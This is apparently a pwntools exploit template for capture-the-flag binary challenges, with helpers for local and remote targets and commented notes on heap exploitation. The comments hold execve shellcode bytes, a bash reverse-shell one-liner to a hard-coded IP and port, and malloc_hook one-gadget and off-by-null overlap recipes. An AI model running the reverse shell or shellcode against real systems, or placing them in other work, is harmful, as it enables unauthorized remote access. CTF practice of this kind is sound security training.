#coding:utf-8
from pwn import *
import pwn_framework as pf
import time
import sys

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x : p.recv(numb = x)
sa = lambda p, a,b : p.sendafter(a,b)
sla = lambda p, a,b : p.sendlineafter(a,b)

# amd64 or x86
context(arch = 'ARCH', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "FILENAME"
ip = "HOST"
port = PORT

LOCAL = 1 if len(sys.argv)==1 else 0


break_points = []

def _get_bstr():
    b_str =""
    for break_point in break_points:
            b_str += "b *" + hex(break_point ) + '\n'
    return b_str

elf = ELF("./"+filename)

remote_libc = "./remote_libc.so"
if LOCAL:
    io = process("./"+filename)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process("./" + filename, env={'LD_PRELOAD': remote_libc}) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def wait(t=0.3):
    sleep(t)

def mydebug(s=''):
    if not LOCAL:
        return
    gdb.attach(io, _get_bstr()+s)

def pause(s = 'pause'):
    if not LOCAL:
        return
    print('pid: ' + str(io.pid))
    raw_input(s)

def sh(p):
    p.interactive()   

def lg(name, val):
    log.info(name+" : "+hex(val))


pause()

# std_in_off = libc.symbols['_IO_2_1_stdin_']

# sc32 = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# sc64 = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

# t = '''bash -c 'bash -i >& /dev/tcp/47.94.239.235/9981 0>&1'''

# '''0x3057 ^ 0x4f65 ^ 0xffff == 0x80cd'''
# _= libc.symbols['realloc']
# _= libc.symbols['__free_hook']


# use malloc to one gadget
# fake2 = libc.symbols['__malloc_hook'] - 0x23 # malloc hook 
# payload = "a"*19 + p64(one) 

# use reallochook
# payload = "a"*(19-8) + p64(one) + p64(libc.symbols['realloc'] + offset)

# <realloc>       push   r15
# <realloc+2>     push   r14
# <realloc+4>     push   r13
# <realloc+6>     push   r12
# <realloc+8>     mov    r13, rsi
# <realloc+11>    push   rbp
# <realloc+12>    push   rbx
# <realloc+13>    mov    rbx, rdi
# <realloc+16>    sub    rsp, 0x38

'''
use stdout to leak libc address
stdout's address p & *(struct _IO_FILE_plus *) stdout
then modify write_ptr
'''


''' off by one
---
0x100 A
---
0x70 B
---
0x100 C
---
0x20 D
--- 
0x30 E


malloc A B C D
FREE A
FREE B
FREE D fill fast bin
FREE E fill fast bin
ADD B1 -> OFF BY NULL
FREE C -> unlink A
mallc A
malloc B2 -> overlap chunk
free B1
free B2
'''
